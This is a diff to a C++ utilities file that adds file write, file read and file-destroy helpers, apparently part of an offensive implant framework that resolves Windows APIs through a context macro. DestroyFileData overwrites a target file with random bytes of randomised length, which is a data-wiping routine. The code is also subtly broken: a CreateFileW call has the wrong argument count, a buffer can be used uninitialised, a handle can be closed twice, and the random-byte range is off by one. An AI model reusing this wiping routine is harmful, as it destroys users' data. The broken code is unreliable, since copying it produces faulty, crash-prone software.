@@ -1,7 +1,80 @@
 #include <core/include/utils.hpp>
+using namespace Utils::Random;
+
 namespace Utils {
 
-    VOID AppendBuffer(uint8_t **buffer, const uint8_t *const target, uint32_t *capacity, const uint32_t length) {
+	BOOL WriteToDisk(const wchar_t *path, const uint8_t* data, size_t size) {
+		HEXANE;
+
+		HANDLE handle = ctx->win32.CreateFileW(path, GENERIC_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (handle == INVALID_HANDLE_VALUE) {
+			return false;
+		}
+
+		DWORD write = 0;
+		BOOL result = ctx->win32.WriteFile(handle, data, (DWORD) size, &write, NULL);
+
+		ctx->win32.NtClose(handle);
+		return (result && write == size);
+	}
+
+	BOOL ReadFromDisk(const wchar_t* path, uint8_t* data, size_t size) {
+		HEXANE; 
+
+		HANDLE handle = ctx->win32.CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (handle == INVALID_HANDLE_VALUE) {
+			return false;
+		}
+
+		DWORD read = 0;
+		BOOL result = ctx->win32.ReadFile(handle, data, (DWORD) size, &read, NULL);
+
+		ctx->win32.CloseHandle(handle);
+		return (result && read == size);
+	}
+
+	BOOL DestroyFileData(const wchar_t* path, size_t size) {
+		HEXANE;
+
+		bool success = false;
+		HANDLE handle = ctx->win32.CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		if (handle == INVALID_HANDLE_VALUE) {
+			goto defer;
+		}
+
+		int new_length = size + ((long long) RandomNumber32() * (long long) RandomNumber32()) % 2000000 + 1000;
+	
+		uint8* rand_data = (uint8*) ctx->win32.RtlAllocateHeap(GetProcessHeap(), HEAP_ZERO_MEMORY, new_length);
+		if (!rand_data) {
+			ctx->win32.NtClose(handle);
+			goto defer;
+		}
+
+		for (size_t i = 0; i < new_length; i++) {
+			rand_data[i] = (uint8)(RandomNumber32() % 255);
+		}
+
+		DWORD write = 0;
+		if (!WriteFile(handle, rand_data, new_length, &write, NULL) || write != new_length) {
+			//Log(L"[!] Error dumping data inside the disk");
+			goto defer;
+		} 
+
+		success = true;
+
+	defer:
+		if (rand_data) {
+			ctx->win32.RtlFreeHeap(GetProcessHeap(), 0, rand_data);
+		}
+		if (handle) {
+			ctx->win32.NtClose(handle);
+		}
+
+		return success;
+	}
+
+
+	VOID AppendBuffer(uint8_t **buffer, const uint8_t *const target, uint32_t *capacity, const uint32_t length) {
         HEXANE;
 
         const auto new_buffer = B_PTR(Realloc(*buffer, *capacity + length));
